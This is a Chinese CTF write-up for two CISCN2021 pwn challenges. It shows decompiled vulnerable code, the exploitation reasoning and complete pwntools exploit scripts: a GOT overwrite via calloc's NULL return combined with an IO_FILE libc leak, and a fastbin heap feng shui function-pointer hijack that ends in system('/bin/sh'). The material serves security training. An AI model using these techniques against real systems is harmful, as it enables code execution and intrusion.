# CISCN2021东北分区

## hard_pwn:

checksec:

```
➜  pwn hard checksec chall
[*] '/home/nitw1t/Sec/CTF/chall/CISCNjuesai/pwn hard/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  '/lib/x86_64-linux-gnu/'
```

因为题目runpath有点问题 需要先patch一下

```
patchelf --remove-rpath chall 
patchelf --set-interpreter b/x86_64-linux-gnu/ld-linux-x86-64.so.2 --set-rpath b/x86_64-linux-gnu/ chall
```



### 题目逻辑：

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v4; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v5; // [rsp+4h] [rbp-Ch] BYREF
  char *v6; // [rsp+8h] [rbp-8h]

  v6 = 0LL;
  v4 = 0;
  v5 = 0;
  printf(": ");
  __isoc99_scanf("%d", &v4);
  if ( v4 > 255 )
    exit(1);
  v6 = (char *)calloc(v4, 4uLL);
  printf(": ");
  __isoc99_scanf("%d", &v5);
  printf("a[%d]:", v5);
  __isoc99_scanf("%d", &v6[4 * v5]);
  puts("Bye!");
  return 0LL;
}
```

利用calloc分配chunk，然后向chunk偏移4 * v5处写入数据，可以实现任意写但会受到calloc分配大小限制

但是如果能让calloc分配一个超级大内存，就会返回NULL，就能改4 * v5处的数据

calloc(nmemb, size);:

```
第一个参数是指分配成员个数，第二个参数为每个成员大小
分配大小：nmemb * size
```



### 思路：

- 因为本题没开PIE，所以可以通过利用calloc返回NULL来改puts_got为main_addr 来无限执行
- 因为程序不存在提权可用的函数，所以需要泄露libc，可以考虑mmap分配chunk与libc基址偏移固定来向IO_FILE结构体操作，限制了可分配大小，但可以看到是通过exit来退出的，劫持exit_got为ret可以实现继续执行calloc
- 计算mmap偏移，修改`flag位`和`IO_write_base` 多调试🐷即可 需要注意，因为scanf每次直接写入四个字节，所以没法像打heap那样只覆盖一字节 需要将整个`IO_write_base`都改成泄露函数puts_got，分两次即可修改高低位
- 之后就直接用第一次改got表方式 修改printf_got为one_gadget



exp:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")	
else:
	p = remote("10.3.120.23",1337)
	libc = ELF("./libc.so.6")

one = [0xe6c7e,0xe6c7e,0xe6c84]
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

puts_got = elf.got['puts']
exit_got = elf.got['exit']
printf_got = elf.got['printf']
main_addr = 0x40078D
ret = 0x00000000004005f1

pd = '1'*0x410
sla(": ",pd)
sla(": ",str(puts_got/4))
sla("]:",str(main_addr))

sla(": ",pd)
sla(": ",str(exit_got/4))
sla("]:",str(ret))

sla(": ",str(0x3000000))
offset_write_l = 0xc1ed6b0
sla(": ",str(offset_write_l/4))
sla("]:",str(puts_got))

sl(str(0x2000000))
offset_write_h = 0x141ee6b4
sl(str(offset_write_h/4))
sl(str(0))

sl(str(0x4000000))
offset_stdout = 0x241ef690
sl(str(offset_stdout/4))
sl(str(4222425088)) # 0xfbad1800
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 0x8ec50
og = one[2] + libc.address
success("libc.address = " + hex(libc.address))
success("og = " + hex(og))
sl(pd)
sl(str(printf_got/4))
sl(str(og))

ti()
```



## GIFT:

check:

```
➜  GIFT checksec chall
[*] '/home/zty/CTF/CISCB/GIFT/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

（这次pwn题是跟got表过不去了 是吧）

### 题目逻辑：

add

```c
int add()
{
  int i; // [rsp+8h] [rbp-18h]
  int v2; // [rsp+Ch] [rbp-14h]
  _QWORD *v3; // [rsp+10h] [rbp-10h]
  void *buf; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 7 && chunk_ptr[i]; ++i )
    ;
  if ( i == 8 )
  {
    puts("full!");
    exit(-1);
  }
  v3 = malloc(0x10uLL);
  if ( !v3 )
  {
    puts("malloc failed!");
    exit(-1);
  }
  v3[1] = &free_addr;
  printf("size: ");
  v2 = read_int();
  if ( v2 < 0 || v2 > 1024 )
  {
    puts("invalid size!");
    exit(-1);
  }
  buf = malloc(v2);
  if ( !buf )
  {
    puts("malloc failed!");
    exit(-1);
  }
  printf("content: ");
  read(0, buf, v2);
  *v3 = buf;
  chunk_ptr[i] = v3;
  return puts("done~");
}
```

free:

```c
int delete()
{
  int v1; // [rsp+Ch] [rbp-14h]

  printf("index: ");
  v1 = read_int();
  if ( v1 < 0 || v1 > 7 )
  {
    puts("out of bound!");
    exit(-1);
  }
  if ( !chunk_ptr[v1] )
  {
    puts("invalid index!");
    exit(-1);
  }
  (**(void (__fastcall ***)(_QWORD))(chunk_ptr[v1] + 8LL))(chunk_ptr[v1]);
  return puts("done~");
}
```

### 思路：

只有add 和 free，add限制了使用次数，而且free是通过执行一起产生的chunk的bk指针上的地址上的函数 把对应chunk作为参数 

而这个地址在add时会写入free函数地址 看到这应该已经想到 可以用堆风水改这个地址为想要执行的函数

正好复习堆风水一种用法

堆布局 目的是分配并写入自动生成的chunk：

add(0x555555757000，0x10)	add(0x555555757020，0x30)

add(0x555555757060，0x10)	add(0x555555757080，0x10)

```
pwndbg> bi
fastbins
0x20: 0x555555757060 —▸ 0x555555757080 —▸ 0x555555757000 ◂— 0x0
0x30: 0x0
0x40: 0x555555757020 ◂— 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

这时，因为在add时 会先申请0x10的chunk

```
pwndbg> bi
fastbins
0x20: 0x555555757080 —▸ 0x555555757000 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

如果再次申请0x10 chunk就可以改写`0x555555757000`的 fd 和 bk。当然bk的值可以是printf，puts，system，one等

回到本题，最初`0x555555757000`chunk操作的是`0x555555757020`，所以就可以通过第二次写入bk的值来对该chunk操作

需要注意：

```
(**(void (__fastcall ***)(_QWORD))(chunk_ptr[v1] + 8LL))(chunk_ptr[v1]);
```

因为是调用的指针的指针，所以需要一个指针指向该处的chunk（比赛的时候因为这个卡到最后



exp:

```python
#!/usr/bin/env python

# -*- coding: utf-8 -*-

from pwn import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 1
if debug == 1:
    p = process("./chall")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
    p = remote("10.3.120.21",9999)
    libc = ELF("./libc.so.6",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
one = [0x45226,0x4527a,0xf03a4,0xf1247]
def add(size,content):
    sla(">> ",str(1))
    sla("size: ",str(size))
    sa("content: ",content)
   
def free(index):
    sla(">> ",str(2))
    sla("index: ",str(index))

add(0x30,'a'*0x10) # 0
add(0x10,'a'*0x10) # 1
free(0)
free(1)
add(0x30,'a'*0x10) # 0
pd = '%8$p'.ljust(8,'\x00') + '\x30'
add(0x10,pd)       # 3
free(0) # printf
gdb.attach(p,'b *$rebase(0x0E15)\nc')
heap_addr = int(p.recv(14).ljust(8,'\x00'),16) - 0x10
free(3)
pd = '%17$p'.ljust(8,'\x00') + '\x30'
add(0x10,pd) # 4
free(0)
libc.address = int(p.recv(14).ljust(8,'\x00'),16) - 240 - libc.sym['__libc_start_main']
sys_addr = libc.sym['system']
og = libc.address + one[0]
success("heap_addr = " + hex(heap_addr))
success("sys_addr = " + hex(sys_addr))
success("libc.address = " + hex(libc.address))
free(4)
add(0x10,'/bin/sh\x00'+p64(heap_addr+0xd0)) # 0
add(0x40,p64(sys_addr))
free(0)
ti()
```

